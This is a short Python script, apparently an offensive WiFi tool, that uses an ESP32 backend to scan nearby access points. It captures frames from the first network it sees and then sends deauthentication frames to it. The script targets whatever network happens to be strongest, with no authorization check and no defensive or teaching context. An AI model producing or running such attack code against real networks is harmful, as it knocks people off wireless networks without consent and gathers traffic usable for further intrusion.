#!/usr/bin/env python3
"""Standalone WiFi automation using ESP32 backend from Linux."""
from __future__ import annotations
import time, threading
from esp32_backend import ESP32Backend

def _main() -> int:
    with ESP32Backend("/dev/ttyUSB0") as backend:
        print("[+] ESP32 backend open")
        print("[~] Scanning 5s ...")
        aps = backend.scan(5.0)
        print(f"[+] APs seen: {len(aps)}")
        for ap in aps[:10]:
            print(f"    {ap.get('bssid')} rssi={ap.get('rssi')}")
        if aps:
            bssid = aps[0]["bssid"]
            backend.set_channel(6)
            print(f"[+] Capturing {bssid} ...")
            frames = backend.capture(bssid, 6, timeout=15.0)
            print(f"[+] captured {len(frames)} frames")
            backend.deauth(bssid, 8)
            print("[+] deauth sent")
    return 0

if __name__ == "__main__":
    raise SystemExit(_main())
